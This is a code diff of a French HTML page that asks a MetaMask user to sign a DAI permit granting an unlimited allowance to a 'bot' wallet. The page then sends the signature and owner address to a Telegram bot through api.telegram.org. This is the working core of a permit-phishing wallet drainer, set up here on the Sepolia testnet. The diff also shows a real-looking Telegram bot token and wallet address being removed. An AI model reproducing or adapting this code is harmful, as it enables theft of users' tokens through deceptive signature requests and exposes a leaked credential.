@@ -2,105 +2,86 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Meta DAI Permit Debug</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
+  <title>Meta DAI Permit</title>
+  <!-- ethers v5 pour compatibilité navigateur -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h1>Signer DAI Permit et envoyer au bot (Debug)</h1>
+  <h1>Signer DAI Permit et envoyer au bot</h1>
   <button onclick="signPermit()">Signer</button>
 
   <script>
-    // ================= CONFIG =================
-    const BOT_TOKEN = "8488605497:AAHskwHjVbpN0oBvYeznvYrk88W33jfsQQw";        // ton bot Telegram
-    const BOT_ETH_ADDRESS = "0xF6BeD72aA6eB2e0DBb2768F07ed77f1c5dCEC6b1"; // wallet du bot
-    const DAI = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844"; // DAI Sepolia
+    const BOT_TOKEN = "TON_BOT_TOKEN";
+    const BOT_ETH_ADDRESS = "0xADRESSE_DU_BOT";
+    const DAI = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844";
     const CHAIN_ID = 11155111; // Sepolia
-    // ==========================================
 
     async function signPermit() {
-      console.clear();
       console.log("🔹 Début signPermit");
 
-      // 1️⃣ Vérification MetaMask
       if (!window.ethereum) {
         alert("MetaMask non détecté !");
-        console.error("MetaMask non détecté !");
-        return;
-      }
-      console.log("MetaMask détecté :", window.ethereum);
-
-      // 2️⃣ Connexion à MetaMask
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      try {
-        await provider.send("eth_requestAccounts", []);
-      } catch(e) {
-        alert("Connexion MetaMask refusée");
-        console.error("Connexion MetaMask refusée", e);
         return;
       }
 
-      const signer = await provider.getSigner();
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
       const owner = await signer.getAddress();
-      console.log("Adresse MetaMask connectée :", owner);
+      console.log("Adresse MetaMask :", owner);
 
-      // 3️⃣ Contrat DAI
       const dai = new ethers.Contract(
         DAI,
-        [
-          "function nonces(address) view returns (uint256)",
-          "function name() view returns (string)"
-        ],
+        ["function nonces(address) view returns (uint256)", "function name() view returns (string)"],
         provider
       );
 
-      let nonce, name;
-      try {
-        nonce = await dai.nonces(owner);
-        name = await dai.name();
-        console.log("Nonce :", nonce.toString());
-        console.log("Nom du token :", name);
-      } catch(e) {
-        alert("Erreur récupération nonce ou name du token");
-        console.error(e);
-        return;
-      }
+      const nonce = await dai.nonces(owner);
+      const name = await dai.name();
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1h
+      const domain = {
+        name: name,
+        version: "1",
+        chainId: CHAIN_ID,
+        verifyingContract: DAI
+      };
 
-      // 4️⃣ Préparer le permit
-      const domain = { name, version: "1", chainId: CHAIN_ID, verifyingContract: DAI };
-      const types = { Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-      ]};
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
       const values = {
         owner,
         spender: BOT_ETH_ADDRESS,
-        value: ethers.MaxUint256,
+        value: ethers.constants.MaxUint256,
         nonce,
         deadline
       };
+
       console.log("Valeurs Permit :", values);
 
-      // 5️⃣ Signer
+      // signer permit
       let signature;
       try {
-        signature = await signer.signTypedData(domain, types, values);
+        signature = await signer._signTypedData(domain, types, values);
         console.log("Signature :", signature);
       } catch(e) {
+        console.error("Erreur signature :", e);
         alert("Erreur lors de la signature");
-        console.error(e);
         return;
       }
 
-      // 6️⃣ Préparer payload pour Telegram
+      // envoyer au bot Telegram
       const payload = { user: owner, value: values.value.toString(), deadline, signature };
-      console.log("Payload envoyé :", payload);
+      console.log("Payload :", payload);
 
-      // 7️⃣ Envoyer au bot Telegram
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
@@ -111,8 +92,8 @@
         console.log("Réponse Telegram :", json);
         alert("✅ Permit signé et envoyé au bot !");
       } catch(e) {
+        console.error("Erreur Telegram :", e);
         alert("Erreur envoi au bot Telegram");
-        console.error(e);
       }
     }
   </script>
